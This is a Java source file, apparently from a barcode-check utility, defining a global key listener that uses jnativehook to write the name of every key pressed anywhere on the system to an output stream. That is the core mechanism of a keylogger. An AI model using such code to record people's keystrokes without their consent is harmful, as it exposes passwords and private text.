package dev.manifest.bccheck;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.util.logging.Logger;

public class GlobalKeyListener implements NativeKeyListener {

    private final static Logger log = Logger.getLogger(GlobalKeyListener.class.getName());

    private OutputStream outputStream;

    public GlobalKeyListener(OutputStream out) {
        outputStream = out;
    }

    /**
     * Invoked when a key has been typed.
     *
     * @param keyEvent the native key event.
     *
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent keyEvent) {

    }

    /**
     * Invoked when a key has been pressed.
     *
     * @param keyEvent the native key event.
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent keyEvent) {
        String keyString = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
        try {
            outputStream.write(keyString.getBytes());
        } catch (IOException e) {
            log.severe("While writing to outputStream- " + keyString + " . Catch exception: " + e.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent keyEvent) {

    }
}
